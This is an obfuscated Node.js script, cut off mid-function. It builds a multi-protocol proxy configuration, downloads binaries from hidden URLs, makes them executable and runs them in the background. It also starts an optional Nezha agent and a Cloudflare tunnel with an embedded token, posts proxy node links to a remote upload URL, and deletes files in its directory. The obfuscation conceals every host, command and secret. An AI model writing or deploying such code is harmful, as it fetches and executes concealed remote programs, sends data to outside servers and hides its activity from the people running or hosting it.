#!/usr/bin/env node

const _0x20aa4b = _0x206e;
(function (_0x46b806, _0x155e99) {
    const _0x3f7577 = _0x206e, _0x480186 = _0x46b806();
    while (!![]) {
        try {
            const _0x449c34 = -parseInt(_0x3f7577(0x160)) / (0x8 * -0x3f2 + 0x633 * 0x5 + 0x1 * 0x92) + parseInt(_0x3f7577(0x252)) / (-0x1 * -0x16c5 + -0x4 * -0x5a6 + 0x2d5b * -0x1) * (parseInt(_0x3f7577(0x116)) / (-0x5 * -0x1af + 0x1f82 + 0x106 * -0x27)) + -parseInt(_0x3f7577(0x22c)) / (-0x3 * 0x67a + -0x1 * 0x1308 + 0x267a) + -parseInt(_0x3f7577(0x2c1)) / (-0x1 * -0x73d + 0x2 * -0x7cf + 0x19 * 0x56) + parseInt(_0x3f7577(0x188)) / (0x2430 + -0xa * -0x29b + 0xb5 * -0x58) + -parseInt(_0x3f7577(0x319)) / (0x1243 + 0xada + -0x1d16) * (parseInt(_0x3f7577(0x16b)) / (-0x1b78 + -0x9c4 + 0x2544)) + -parseInt(_0x3f7577(0xfc)) / (-0x82c + -0x14fd + -0x2 * -0xe99) * (-parseInt(_0x3f7577(0x25c)) / (-0x1b23 + 0x144 * 0x2 + 0x18a5));
            if (_0x449c34 === _0x155e99)
                break;
            else
                _0x480186['push'](_0x480186['shift']());
        } catch (_0x2dd668) {
            _0x480186['push'](_0x480186['shift']());
        }
    }
}(_0x20c9, 0xf56fc + 0xf7583 + -0x1435cc));
const http = require(_0x20aa4b(0x1dc)), axios = require(_0x20aa4b(0x2a9)), os = require('os'), fs = require('fs'), path = require(_0x20aa4b(0x224)), {promisify} = require(_0x20aa4b(0x2ab)), exec = promisify(require(_0x20aa4b(0x200) + _0x20aa4b(0x324))[_0x20aa4b(0x244)]), UPLOAD_URL = process[_0x20aa4b(0x307)][_0x20aa4b(0xfe)] || '', PROJECT_URL = process[_0x20aa4b(0x307)][_0x20aa4b(0x135) + 'L'] || '', AUTO_ACCESS = process[_0x20aa4b(0x307)][_0x20aa4b(0x123) + 'S'] || ![], FILE_PATH = process[_0x20aa4b(0x307)][_0x20aa4b(0x1ab)] || _0x20aa4b(0x183), SUB_PATH = process[_0x20aa4b(0x307)][_0x20aa4b(0x105)] || _0x20aa4b(0x173), PORT = process[_0x20aa4b(0x307)][_0x20aa4b(0x1fb) + 'T'] || process[_0x20aa4b(0x307)][_0x20aa4b(0x138)] || 0x19 * 0x5a + -0x5e * -0x68 + -0x11a1 * 0x2, UUID = process[_0x20aa4b(0x307)][_0x20aa4b(0x11e)] || _0x20aa4b(0x172) + _0x20aa4b(0x127) + _0x20aa4b(0x294) + _0x20aa4b(0x27b), NEZHA_SERVER = process[_0x20aa4b(0x307)][_0x20aa4b(0x226) + 'ER'] || '', NEZHA_PORT = process[_0x20aa4b(0x307)][_0x20aa4b(0x246)] || '', NEZHA_KEY = process[_0x20aa4b(0x307)][_0x20aa4b(0x1ee)] || '', ARGO_DOMAIN = process[_0x20aa4b(0x307)][_0x20aa4b(0x207) + 'N'] || _0x20aa4b(0x21a) + _0x20aa4b(0x1e3) + _0x20aa4b(0x194), ARGO_AUTH = process[_0x20aa4b(0x307)][_0x20aa4b(0x22a)] || _0x20aa4b(0xf2) + _0x20aa4b(0x269) + _0x20aa4b(0xd5) + _0x20aa4b(0x1cc) + _0x20aa4b(0x30c) + _0x20aa4b(0x23f) + _0x20aa4b(0x2b4) + _0x20aa4b(0x2a3) + _0x20aa4b(0x1da) + _0x20aa4b(0x14b) + _0x20aa4b(0x26c) + _0x20aa4b(0x154) + _0x20aa4b(0x147) + _0x20aa4b(0x18d) + _0x20aa4b(0x306) + _0x20aa4b(0x18e) + _0x20aa4b(0x1b3) + _0x20aa4b(0x111) + _0x20aa4b(0xd7), ARGO_PORT = process[_0x20aa4b(0x307)][_0x20aa4b(0x145)] || 0x54 * 0x62 + -0x1eb3 + -0xa09 * -0x3, CFIP = process[_0x20aa4b(0x307)][_0x20aa4b(0x30a)] || _0x20aa4b(0xdf) + 'an', CFPORT = process[_0x20aa4b(0x307)][_0x20aa4b(0x266)] || -0x202f + 0xbcb * -0x3 + 0x454b, NAME = process[_0x20aa4b(0x307)][_0x20aa4b(0x31f)] || _0x20aa4b(0x282);
!fs[_0x20aa4b(0x304)](FILE_PATH) ? (fs[_0x20aa4b(0x219)](FILE_PATH), console[_0x20aa4b(0x270)](FILE_PATH + (_0x20aa4b(0xf7) + 'd'))) : console[_0x20aa4b(0x270)](FILE_PATH + (_0x20aa4b(0x1b6) + _0x20aa4b(0x114)));
function generateRandomName() {
    const _0x4ed6fe = _0x20aa4b, _0x41585a = {
            'LvWhM': _0x4ed6fe(0x28b) + _0x4ed6fe(0x316) + _0x4ed6fe(0x2df),
            'UnWEH': function (_0x358bc1, _0x32c3b0) {
                return _0x358bc1 < _0x32c3b0;
            },
            'MaOYT': function (_0x265cce, _0x35efec) {
                return _0x265cce * _0x35efec;
            }
        }, _0x11d53d = _0x41585a[_0x4ed6fe(0x21c)];
    let _0x162ba9 = '';
    for (let _0x8fe74f = -0x1f41 + 0x1a2e + 0x513 * 0x1; _0x41585a[_0x4ed6fe(0x202)](_0x8fe74f, -0xc64 + 0x307 + 0x321 * 0x3); _0x8fe74f++) {
        _0x162ba9 += _0x11d53d[_0x4ed6fe(0x215)](Math[_0x4ed6fe(0x274)](_0x41585a[_0x4ed6fe(0x264)](Math[_0x4ed6fe(0x170)](), _0x11d53d[_0x4ed6fe(0x139)])));
    }
    return _0x162ba9;
}
let subContent = null;
const npmName = generateRandomName(), webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName();
let npmPath = path[_0x20aa4b(0x1aa)](FILE_PATH, npmName), phpPath = path[_0x20aa4b(0x1aa)](FILE_PATH, phpName), webPath = path[_0x20aa4b(0x1aa)](FILE_PATH, webName), botPath = path[_0x20aa4b(0x1aa)](FILE_PATH, botName), subPath = path[_0x20aa4b(0x1aa)](FILE_PATH, _0x20aa4b(0x296)), listPath = path[_0x20aa4b(0x1aa)](FILE_PATH, _0x20aa4b(0x1e0)), bootLogPath = path[_0x20aa4b(0x1aa)](FILE_PATH, _0x20aa4b(0x184)), configPath = path[_0x20aa4b(0x1aa)](FILE_PATH, _0x20aa4b(0x2f0) + 'n');
function deleteNodes() {
    const _0x4229a2 = _0x20aa4b, _0xa8c9d0 = {
            'DxJyy': _0x4229a2(0x162),
            'RwYWu': _0x4229a2(0x192),
            'pRcPh': function (_0x1ba173, _0x5991e4) {
                return _0x1ba173 === _0x5991e4;
            },
            'xTsRK': _0x4229a2(0x20b) + _0x4229a2(0x181)
        };
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs[_0x4229a2(0x304)](subPath))
            return;
        let _0x5c48bc;
        try {
            _0x5c48bc = fs[_0x4229a2(0x1c3) + 'nc'](subPath, _0xa8c9d0[_0x4229a2(0x2b1)]);
        } catch {
            return null;
        }
        const _0x54da3d = Buffer[_0x4229a2(0x1f7)](_0x5c48bc, _0xa8c9d0[_0x4229a2(0x12d)])[_0x4229a2(0x2cc)](_0xa8c9d0[_0x4229a2(0x2b1)]), _0x36a0c1 = _0x54da3d[_0x4229a2(0x27c)]('\x0a')[_0x4229a2(0x199)](_0x4566dd => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4229a2(0xe7)](_0x4566dd));
        if (_0xa8c9d0[_0x4229a2(0x303)](_0x36a0c1[_0x4229a2(0x139)], -0x2 * -0x5c9 + 0x56 * -0x35 + -0x39 * -0x1c))
            return;
        return axios[_0x4229a2(0xfd)](UPLOAD_URL + (_0x4229a2(0x2e4) + _0x4229a2(0x2d6)), JSON[_0x4229a2(0x24d)]({ 'nodes': _0x36a0c1 }), { 'headers': { 'Content-Type': _0xa8c9d0[_0x4229a2(0x18a)] } })[_0x4229a2(0x233)](_0x11456c => {
            return null;
        }), null;
    } catch (_0x2d5788) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0x76d69c = _0x20aa4b;
    try {
        const _0x48025f = fs[_0x76d69c(0x25d) + 'c'](FILE_PATH);
        _0x48025f[_0x76d69c(0x236)](_0x151833 => {
            const _0x32c0d3 = _0x76d69c, _0x348a34 = path[_0x32c0d3(0x1aa)](FILE_PATH, _0x151833);
            try {
                const _0x54389d = fs[_0x32c0d3(0x283)](_0x348a34);
                _0x54389d[_0x32c0d3(0x276)]() && fs[_0x32c0d3(0x1a8)](_0x348a34);
            } catch (_0x4c269d) {
            }
        });
    } catch (_0x29cbfe) {
    }
}
async function generateConfig() {
    const _0x5e2148 = _0x20aa4b, _0x27507 = {
            'HltTl': _0x5e2148(0x309),
            'RFlJX': _0x5e2148(0x26f),
            'dYbzt': _0x5e2148(0x253),
            'Dinpj': _0x5e2148(0x25f) + _0x5e2148(0x136),
            'TtjGE': _0x5e2148(0x2af) + 'o',
            'qWuha': _0x5e2148(0x239) + 'o',
            'arMMc': _0x5e2148(0x110) + 'go',
            'mzQXU': _0x5e2148(0xff),
            'cRsup': _0x5e2148(0x247),
            'yxpyp': _0x5e2148(0x1dc),
            'OVEnU': _0x5e2148(0x2ea),
            'smvkC': _0x5e2148(0x293),
            'OhPtb': _0x5e2148(0x1fa),
            'zFJLp': _0x5e2148(0x31b),
            'eGbEo': _0x5e2148(0x217) + _0x5e2148(0x13f) + _0x5e2148(0xd6) + 'y',
            'pzroR': _0x5e2148(0xd9),
            'nuhZr': _0x5e2148(0x10c),
            'XHwrD': _0x5e2148(0x24f),
            'jCBdg': _0x5e2148(0x2f9),
            'sxxNo': _0x5e2148(0x2f0) + 'n'
        }, _0x419541 = {
            'log': {
                'access': _0x27507[_0x5e2148(0x130)],
                'error': _0x27507[_0x5e2148(0x130)],
                'loglevel': _0x27507[_0x5e2148(0x268)]
            },
            'inbounds': [
                {
                    'port': ARGO_PORT,
                    'protocol': _0x27507[_0x5e2148(0x2d3)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'flow': _0x27507[_0x5e2148(0x10e)]
                            }],
                        'decryption': _0x27507[_0x5e2148(0x268)],
                        'fallbacks': [
                            { 'dest': 0xbb9 },
                            {
                                'path': _0x27507[_0x5e2148(0x17f)],
                                'dest': 0xbba
                            },
                            {
                                'path': _0x27507[_0x5e2148(0x24a)],
                                'dest': 0xbbb
                            },
                            {
                                'path': _0x27507[_0x5e2148(0x144)],
                                'dest': 0xbbc
                            }
                        ]
                    },
                    'streamSettings': { 'network': _0x27507[_0x5e2148(0x17b)] }
                },
                {
                    'port': 0xbb9,
                    'listen': _0x27507[_0x5e2148(0x321)],
                    'protocol': _0x27507[_0x5e2148(0x2d3)],
                    'settings': {
                        'clients': [{ 'id': UUID }],
                        'decryption': _0x27507[_0x5e2148(0x268)]
                    },
                    'streamSettings': {
                        'network': _0x27507[_0x5e2148(0x17b)],
                        'security': _0x27507[_0x5e2148(0x268)]
                    }
                },
                {
                    'port': 0xbba,
                    'listen': _0x27507[_0x5e2148(0x321)],
                    'protocol': _0x27507[_0x5e2148(0x2d3)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'level': 0x0
                            }],
                        'decryption': _0x27507[_0x5e2148(0x268)]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x27507[_0x5e2148(0x268)],
                        'wsSettings': { 'path': _0x27507[_0x5e2148(0x17f)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x27507[_0x5e2148(0x17a)],
                            _0x27507[_0x5e2148(0x193)],
                            _0x27507[_0x5e2148(0x11d)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbb,
                    'listen': _0x27507[_0x5e2148(0x321)],
                    'protocol': _0x27507[_0x5e2148(0x31a)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'alterId': 0x0
                            }]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'wsSettings': { 'path': _0x27507[_0x5e2148(0x24a)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x27507[_0x5e2148(0x17a)],
                            _0x27507[_0x5e2148(0x193)],
                            _0x27507[_0x5e2148(0x11d)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbc,
                    'listen': _0x27507[_0x5e2148(0x321)],
                    'protocol': _0x27507[_0x5e2148(0xf9)],
                    'settings': { 'clients': [{ 'password': UUID }] },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x27507[_0x5e2148(0x268)],
                        'wsSettings': { 'path': _0x27507[_0x5e2148(0x144)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x27507[_0x5e2148(0x17a)],
                            _0x27507[_0x5e2148(0x193)],
                            _0x27507[_0x5e2148(0x11d)]
                        ],
                        'metadataOnly': ![]
                    }
                }
            ],
            'dns': { 'servers': [_0x27507[_0x5e2148(0x225)]] },
            'outbounds': [
                {
                    'protocol': _0x27507[_0x5e2148(0x152)],
                    'tag': _0x27507[_0x5e2148(0xe6)]
                },
                {
                    'protocol': _0x27507[_0x5e2148(0x118)],
                    'tag': _0x27507[_0x5e2148(0x314)]
                }
            ]
        };
    fs[_0x5e2148(0x2a8) + _0x5e2148(0xe8)](path[_0x5e2148(0x1aa)](FILE_PATH, _0x27507[_0x5e2148(0x29e)]), JSON[_0x5e2148(0x24d)](_0x419541, null, 0x4 * -0x8f9 + -0x8 * -0x26b + 0x2 * 0x847));
}
function getSystemArchitecture() {
    const _0x5e14a2 = _0x20aa4b, _0x5f2e9f = {
            'OkKUc': function (_0x136be0, _0xb95a5e) {
                return _0x136be0 === _0xb95a5e;
            },
            'jMbRy': _0x5e14a2(0x23a),
            'aTvsy': function (_0x546d11, _0x16f165) {
                return _0x546d11 === _0x16f165;
            },
            'FQmzu': _0x5e14a2(0x245),
            'oPrmM': _0x5e14a2(0x1e6),
            'GTcym': _0x5e14a2(0x15b)
        }, _0x4287f6 = os[_0x5e14a2(0xe3)]();
    return _0x5f2e9f[_0x5e14a2(0x14d)](_0x4287f6, _0x5f2e9f[_0x5e14a2(0x234)]) || _0x5f2e9f[_0x5e14a2(0x28a)](_0x4287f6, _0x5f2e9f[_0x5e14a2(0x29c)]) || _0x5f2e9f[_0x5e14a2(0x28a)](_0x4287f6, _0x5f2e9f[_0x5e14a2(0x257)]) ? _0x5f2e9f[_0x5e14a2(0x234)] : _0x5f2e9f[_0x5e14a2(0xf6)];
}
function downloadFile(_0x429a34, _0x4c06ed, _0x26ddd2) {
    const _0x577b65 = _0x20aa4b, _0x11eb25 = {
            'BILVe': function (_0x1c7c03, _0x432920, _0x3fb3d5) {
                return _0x1c7c03(_0x432920, _0x3fb3d5);
            },
            'fVLxI': function (_0x1b4c51, _0x163bd8) {
                return _0x1b4c51(_0x163bd8);
            },
            'oXwJM': _0x577b65(0x161),
            'hUGhr': _0x577b65(0x15a),
            'fXsxA': function (_0x1868d2, _0x5d1f5a) {
                return _0x1868d2(_0x5d1f5a);
            },
            'hZzgH': _0x577b65(0x2e6),
            'AiHJe': _0x577b65(0x2bd)
        }, _0x173cef = _0x429a34;
    !fs[_0x577b65(0x304)](FILE_PATH) && fs[_0x577b65(0x219)](FILE_PATH, { 'recursive': !![] });
    const _0x278854 = fs[_0x577b65(0x2db) + _0x577b65(0x14c)](_0x173cef);
    _0x11eb25[_0x577b65(0x2e1)](axios, {
        'method': _0x11eb25[_0x577b65(0x2c7)],
        'url': _0x4c06ed,
        'responseType': _0x11eb25[_0x577b65(0x212)]
    })[_0x577b65(0x2fa)](_0x56e210 => {
        const _0x32843a = _0x577b65, _0x25f4a6 = {
                'MnIsH': function (_0x168c27, _0x231860) {
                    const _0x436bc0 = _0x206e;
                    return _0x11eb25[_0x436bc0(0x1b5)](_0x168c27, _0x231860);
                }
            };
        _0x56e210[_0x32843a(0x29a)][_0x32843a(0x1a3)](_0x278854), _0x278854['on'](_0x11eb25[_0x32843a(0x2da)], () => {
            const _0x2f6dd1 = _0x32843a;
            _0x278854[_0x2f6dd1(0x20f)](), console[_0x2f6dd1(0x270)](_0x2f6dd1(0x1a2) + path[_0x2f6dd1(0x1e4)](_0x173cef) + (_0x2f6dd1(0x31d) + _0x2f6dd1(0x2f4))), _0x11eb25[_0x2f6dd1(0x175)](_0x26ddd2, null, _0x173cef);
        }), _0x278854['on'](_0x11eb25[_0x32843a(0x218)], _0x3ef52f => {
            const _0x5b199e = _0x32843a;
            fs[_0x5b199e(0x30f)](_0x173cef, () => {
            });
            const _0x3bb022 = _0x5b199e(0x1a2) + path[_0x5b199e(0x1e4)](_0x173cef) + _0x5b199e(0x131) + _0x3ef52f[_0x5b199e(0x203)];
            console[_0x5b199e(0x15a)](_0x3bb022), _0x25f4a6[_0x5b199e(0x16a)](_0x26ddd2, _0x3bb022);
        });
    })[_0x577b65(0x233)](_0x9a4d7f => {
        const _0x501ed0 = _0x577b65, _0x51c05a = _0x501ed0(0x1a2) + path[_0x501ed0(0x1e4)](_0x173cef) + _0x501ed0(0x131) + _0x9a4d7f[_0x501ed0(0x203)];
        console[_0x501ed0(0x15a)](_0x51c05a), _0x11eb25[_0x501ed0(0x1b5)](_0x26ddd2, _0x51c05a);
    });
}
async function downloadFilesAndRun() {
    const _0x4df080 = _0x20aa4b, _0x2d0f4f = {
            'nNmMQ': function (_0x215c2d, _0x45b9e6, _0x488b66, _0x520b08) {
                return _0x215c2d(_0x45b9e6, _0x488b66, _0x520b08);
            },
            'yLQDF': function (_0x526335, _0x3fbedf) {
                return _0x526335(_0x3fbedf);
            },
            'qlfNA': function (_0x186504) {
                return _0x186504();
            },
            'yHJla': function (_0x10744c, _0x5ea648) {
                return _0x10744c === _0x5ea648;
            },
            'lOOmA': _0x4df080(0x168) + _0x4df080(0x23b) + _0x4df080(0x14e),
            'dPaNm': function (_0x554125, _0x3412e7) {
                return _0x554125(_0x3412e7);
            },
            'JcHSH': function (_0x23b094, _0x21728c) {
                return _0x23b094 && _0x21728c;
            },
            'EIoFm': _0x4df080(0x222),
            'IpEZc': _0x4df080(0x2e8),
            'vHTHW': _0x4df080(0x250),
            'CKPhy': _0x4df080(0x196),
            'Quuni': _0x4df080(0x1dd),
            'YNYkc': _0x4df080(0x256),
            'MuYQZ': _0x4df080(0x315),
            'yquXj': _0x4df080(0x1e9),
            'YBtWB': _0x4df080(0x2ef) + 'l',
            'KHYNa': _0x4df080(0x237),
            'rJnEy': _0x4df080(0x1a6) + _0x4df080(0x26d) + _0x4df080(0x24b) + _0x4df080(0x100),
            'MFKSb': function (_0x9cc941, _0xfaef52) {
                return _0x9cc941(_0xfaef52);
            }
        }, _0x5d247c = _0x2d0f4f[_0x4df080(0x178)](getSystemArchitecture), _0x185ff6 = _0x2d0f4f[_0x4df080(0x251)](getFilesForArchitecture, _0x5d247c);
    if (_0x2d0f4f[_0x4df080(0x205)](_0x185ff6[_0x4df080(0x139)], 0x3 * -0x6d3 + 0x299 * 0x5 + 0x2 * 0x3be)) {
        console[_0x4df080(0x270)](_0x4df080(0x1d6) + _0x4df080(0x204) + _0x4df080(0x1c5) + _0x4df080(0x195) + _0x4df080(0x23d));
        return;
    }
    const _0x47b63e = _0x185ff6[_0x4df080(0x1cf)](_0x277cd1 => {
        const _0x1fb5cf = {
            'ksMJj': function (_0x1ef8be, _0x4c017e) {
                const _0x32f342 = _0x206e;
                return _0x2d0f4f[_0x32f342(0x251)](_0x1ef8be, _0x4c017e);
            }
        };
        return new Promise((_0x583452, _0x9c53ba) => {
            const _0x41f697 = _0x206e;
            _0x2d0f4f[_0x41f697(0x124)](downloadFile, _0x277cd1[_0x41f697(0x1ac)], _0x277cd1[_0x41f697(0x1f6)], (_0xddf569, _0x128caa) => {
                const _0x4e4e80 = _0x41f697;
                _0xddf569 ? _0x1fb5cf[_0x4e4e80(0x189)](_0x9c53ba, _0xddf569) : _0x1fb5cf[_0x4e4e80(0x189)](_0x583452, _0x128caa);
            });
        });
    });
    try {
        await Promise[_0x4df080(0x2c2)](_0x47b63e);
    } catch (_0xc3b2ff) {
        console[_0x4df080(0x15a)](_0x2d0f4f[_0x4df080(0xd8)], _0xc3b2ff);
        return;
    }
    function _0x2a21ea(_0x361d16) {
        const _0x50c911 = _0x4df080, _0xfc424a = -0x1 * -0x6e4 + 0xb3 * -0x1b + 0xdfa;
        _0x361d16[_0x50c911(0x236)](_0x1b7fb7 => {
            const _0x1dd464 = _0x50c911;
            fs[_0x1dd464(0x304)](_0x1b7fb7) && fs[_0x1dd464(0x22b)](_0x1b7fb7, _0xfc424a, _0x114ad4 => {
                const _0x3b5109 = _0x1dd464;
                _0x114ad4 ? console[_0x3b5109(0x15a)](_0x3b5109(0x1d9) + _0x3b5109(0x311) + _0x3b5109(0x12a) + _0x1b7fb7 + ':\x20' + _0x114ad4) : console[_0x3b5109(0x270)](_0x3b5109(0x1d9) + _0x3b5109(0x1c8) + _0x3b5109(0x211) + _0x1b7fb7 + ':\x20' + _0xfc424a[_0x3b5109(0x2cc)](0x663 + -0x1f94 * -0x1 + -0xf9 * 0x27));
            });
        });
    }
    const _0x14f3d3 = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x2d0f4f[_0x4df080(0x1c6)](_0x2a21ea, _0x14f3d3);
    if (_0x2d0f4f[_0x4df080(0x1b1)](NEZHA_SERVER, NEZHA_KEY)) {
        if (!NEZHA_PORT) {
            const _0xf4c627 = NEZHA_SERVER[_0x4df080(0x323)](':') ? NEZHA_SERVER[_0x4df080(0x27c)](':')[_0x4df080(0x28d)]() : '', _0x146a3c = new Set([
                    _0x2d0f4f[_0x4df080(0x115)],
                    _0x2d0f4f[_0x4df080(0x30e)],
                    _0x2d0f4f[_0x4df080(0x18b)],
                    _0x2d0f4f[_0x4df080(0x2d9)],
                    _0x2d0f4f[_0x4df080(0x2b0)],
                    _0x2d0f4f[_0x4df080(0x1d4)]
                ]), _0x888d40 = _0x146a3c[_0x4df080(0x156)](_0xf4c627) ? _0x2d0f4f[_0x4df080(0x201)] : _0x2d0f4f[_0x4df080(0x24c)], _0x4c15bb = _0x4df080(0x197) + _0x4df080(0x21b) + NEZHA_KEY + (_0x4df080(0x198) + _0x4df080(0x14a) + _0x4df080(0xdd) + _0x4df080(0x2c0) + _0x4df080(0x186) + _0x4df080(0x20d) + _0x4df080(0xec) + _0x4df080(0x2b6) + _0x4df080(0x11a) + _0x4df080(0x2c9) + _0x4df080(0x1b9) + _0x4df080(0x1ef) + _0x4df080(0x2cd) + _0x4df080(0x290) + _0x4df080(0x2bf) + _0x4df080(0x275) + _0x4df080(0xfb) + _0x4df080(0x17d) + _0x4df080(0x148) + _0x4df080(0xef) + _0x4df080(0x1cb) + _0x4df080(0x1bc)) + NEZHA_SERVER + (_0x4df080(0xde) + _0x4df080(0x30d) + _0x4df080(0xf3) + _0x4df080(0x16f) + _0x4df080(0x288) + _0x4df080(0x2c8) + _0x4df080(0x1ea) + _0x4df080(0x1a9)) + _0x888d40 + (_0x4df080(0x177) + _0x4df080(0x261) + _0x4df080(0x2ad) + _0x4df080(0x2e9) + _0x4df080(0x1cd) + _0x4df080(0x2ff) + _0x4df080(0x1c1)) + UUID;
            fs[_0x4df080(0x2a8) + _0x4df080(0xe8)](path[_0x4df080(0x1aa)](FILE_PATH, _0x2d0f4f[_0x4df080(0x1e2)]), _0x4c15bb);
            const _0x39ea9f = _0x4df080(0x2ce) + phpPath + _0x4df080(0x133) + FILE_PATH + (_0x4df080(0x2f5) + _0x4df080(0xe4) + _0x4df080(0x2e2) + '&');
            try {
                await _0x2d0f4f[_0x4df080(0x1c6)](exec, _0x39ea9f), console[_0x4df080(0x270)](phpName + (_0x4df080(0x1af) + 'g')), await new Promise(_0x5a4cda => setTimeout(_0x5a4cda, 0x56 * 0x43 + 0x2 * 0x6d6 + -0x2046));
            } catch (_0x606a13) {
                console[_0x4df080(0x15a)](_0x4df080(0x1a0) + _0x4df080(0xf8) + _0x606a13);
            }
        } else {
            let _0x1902e0 = '';
            const _0x35a1d2 = [
                _0x2d0f4f[_0x4df080(0x115)],
                _0x2d0f4f[_0x4df080(0x30e)],
                _0x2d0f4f[_0x4df080(0x18b)],
                _0x2d0f4f[_0x4df080(0x2d9)],
                _0x2d0f4f[_0x4df080(0x2b0)],
                _0x2d0f4f[_0x4df080(0x1d4)]
            ];
            _0x35a1d2[_0x4df080(0x323)](NEZHA_PORT) && (_0x1902e0 = _0x2d0f4f[_0x4df080(0x2dd)]);
            const _0x8de6d2 = _0x4df080(0x2ce) + npmPath + _0x4df080(0x107) + NEZHA_SERVER + ':' + NEZHA_PORT + _0x4df080(0x1d8) + NEZHA_KEY + '\x20' + _0x1902e0 + (_0x4df080(0x142) + _0x4df080(0xf1) + _0x4df080(0x2a7) + _0x4df080(0x1b0) + _0x4df080(0x22d) + _0x4df080(0x265) + _0x4df080(0x2f1) + _0x4df080(0x320) + '\x20&');
            try {
                await _0x2d0f4f[_0x4df080(0x1c6)](exec, _0x8de6d2), console[_0x4df080(0x270)](npmName + (_0x4df080(0x1af) + 'g')), await new Promise(_0xecb628 => setTimeout(_0xecb628, -0x4a + -0x35d + 0x3 * 0x285));
            } catch (_0x51413f) {
                console[_0x4df080(0x15a)](_0x4df080(0x1bb) + _0x4df080(0xf8) + _0x51413f);
            }
        }
    } else
        console[_0x4df080(0x270)](_0x2d0f4f[_0x4df080(0x1e5)]);
    const _0x1af68d = _0x4df080(0x2ce) + webPath + _0x4df080(0xf5) + FILE_PATH + (_0x4df080(0x101) + _0x4df080(0x317) + _0x4df080(0x249));
    try {
        await _0x2d0f4f[_0x4df080(0x229)](exec, _0x1af68d), console[_0x4df080(0x270)](webName + (_0x4df080(0x1af) + 'g')), await new Promise(_0x4697c9 => setTimeout(_0x4697c9, 0x53 * 0x37 + 0x7 * 0x547 + -0x2fe * 0x11));
    } catch (_0x5536ed) {
        console[_0x4df080(0x15a)](_0x4df080(0x10b) + _0x4df080(0xf8) + _0x5536ed);
    }
    if (fs[_0x4df080(0x304)](botPath)) {
        let _0x51d0c1;
        if (ARGO_AUTH[_0x4df080(0x113)](/^[A-Z0-9a-z=]{120,250}$/))
            _0x51d0c1 = _0x4df080(0x117) + _0x4df080(0x1d2) + _0x4df080(0x103) + _0x4df080(0x20a) + _0x4df080(0x1c9) + _0x4df080(0x1a4) + _0x4df080(0x167) + _0x4df080(0xdb) + ARGO_AUTH;
        else
            ARGO_AUTH[_0x4df080(0x113)](/TunnelSecret/) ? _0x51d0c1 = _0x4df080(0x117) + _0x4df080(0x1d2) + _0x4df080(0x103) + _0x4df080(0x1c7) + FILE_PATH + (_0x4df080(0x285) + _0x4df080(0x182)) : _0x51d0c1 = _0x4df080(0x117) + _0x4df080(0x1d2) + _0x4df080(0x103) + _0x4df080(0x20a) + _0x4df080(0x1c9) + _0x4df080(0x1a4) + _0x4df080(0x2b3) + _0x4df080(0x12b) + FILE_PATH + (_0x4df080(0x228) + _0x4df080(0x1ae) + _0x4df080(0x26a) + _0x4df080(0xdc) + _0x4df080(0x174)) + ARGO_PORT;
        try {
            await _0x2d0f4f[_0x4df080(0x251)](exec, _0x4df080(0x2ce) + botPath + '\x20' + _0x51d0c1 + (_0x4df080(0x1ba) + _0x4df080(0x2f7))), console[_0x4df080(0x270)](botName + (_0x4df080(0x1af) + 'g')), await new Promise(_0x4fafc4 => setTimeout(_0x4fafc4, 0x12f * 0x6 + 0xa8c + -0x2 * 0x4eb));
        } catch (_0x49ef75) {
            console[_0x4df080(0x15a)](_0x4df080(0x1f9) + _0x4df080(0x1ca) + _0x4df080(0x2fb) + _0x49ef75);
        }
    }
    await new Promise(_0x3c965c => setTimeout(_0x3c965c, 0x1119 + 0xfa8 + 0xd39 * -0x1));
}
function getFilesForArchitecture(_0x1551eb) {
    const _0x5178bc = _0x20aa4b, _0x1baeb2 = {
            'eEEWV': function (_0x550256, _0x5e4bb2) {
                return _0x550256 === _0x5e4bb2;
            },
            'bxkdQ': _0x5178bc(0x23a),
            'eAeMl': _0x5178bc(0x1f5) + _0x5178bc(0x10f) + _0x5178bc(0x243),
            'zObKO': _0x5178bc(0x1f5) + _0x5178bc(0x10f) + _0x5178bc(0x2d5),
            'EnaZk': _0x5178bc(0x2a4) + _0x5178bc(0x23e) + _0x5178bc(0x243),
            'ehDPP': _0x5178bc(0x2a4) + _0x5178bc(0x23e) + _0x5178bc(0x2d5),
            'iieHY': function (_0x3ef50d, _0x4edff5) {
                return _0x3ef50d && _0x4edff5;
            },
            'QylyZ': function (_0x12ffb2, _0x5ce3d1) {
                return _0x12ffb2 === _0x5ce3d1;
            },
            'SwnUX': _0x5178bc(0x1f5) + _0x5178bc(0x10f) + _0x5178bc(0x28c) + 't',
            'yxOJK': _0x5178bc(0x2a4) + _0x5178bc(0x23e) + _0x5178bc(0x28c) + 't',
            'TPZBY': function (_0x4cd370, _0x489c77) {
                return _0x4cd370 === _0x489c77;
            },
            'LrqPz': _0x5178bc(0x1f5) + _0x5178bc(0x10f) + _0x5178bc(0x2a2),
            'txrDL': _0x5178bc(0x2a4) + _0x5178bc(0x23e) + _0x5178bc(0x2a2)
        };
    let _0x208a02;
    _0x1baeb2[_0x5178bc(0x308)](_0x1551eb, _0x1baeb2[_0x5178bc(0x1be)]) ? _0x208a02 = [
        {
            'fileName': webPath,
            'fileUrl': _0x1baeb2[_0x5178bc(0x209)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x1baeb2[_0x5178bc(0x2ba)]
        }
    ] : _0x208a02 = [
        {
            'fileName': webPath,
            'fileUrl': _0x1baeb2[_0x5178bc(0x230)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x1baeb2[_0x5178bc(0x132)]
        }
    ];
